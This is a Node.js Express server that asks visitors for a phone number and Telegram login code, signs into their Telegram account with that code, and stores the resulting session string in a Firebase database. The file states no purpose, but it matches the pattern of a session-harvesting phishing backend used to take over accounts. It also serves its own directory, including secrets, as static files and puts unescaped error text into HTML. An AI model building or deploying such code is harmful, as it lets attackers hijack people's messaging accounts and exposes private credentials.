require('dotenv').config();
const express = require('express');
const path = require('path');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const admin = require('firebase-admin');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('.'));

// Firebase setup
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  }),
  databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
});
const db = admin.database();

// Telegram credentials
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Temp store phone session in memory
const tempSessions = {};

// ------------------- SEND OTP -------------------
app.post('/send-otp', async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.json({ success: false, error: 'Phone required' });

  try {
    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });

    await client.start({
      phoneNumber: async () => phone,
      password: async () => '', // optional 2FA, adjust if needed
      onError: (err) => console.log(err)
    });

    // Send code
    const result = await client.sendCodeRequest(phone);

    // Store temp session object in memory for OTP verification
    tempSessions[phone] = { client, phone_code_hash: result.phoneCodeHash };

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.json({ success: false, error: err.message });
  }
});

// ------------------- VERIFY OTP & LOGIN -------------------
app.post('/login', async (req, res) => {
  const { phone, otp } = req.body;
  if (!phone || !otp) return res.send('Phone & OTP required');

  try {
    const temp = tempSessions[phone];
    if (!temp) return res.send('No OTP request found for this phone');

    const { client, phone_code_hash } = temp;

    // Sign in with OTP
    await client.signIn({
      phoneNumber: phone,
      phoneCode: otp,
      phoneCodeHash: phone_code_hash
    });

    // Save session string
    const sessionString = client.session.save();

    // Store session in Firebase
    await db.ref('telegram_sessions/' + phone).set({
      session: sessionString,
      timestamp: Date.now()
    });

    // Clear temp session
    delete tempSessions[phone];

    res.send(`<h3>Login successful! Session saved in Firebase.</h3><p><a href="/">Back</a></p>`);
  } catch (err) {
    console.error(err);
    res.send(`<h3>Login failed: ${err.message}</h3><p><a href="/">Back</a></p>`);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));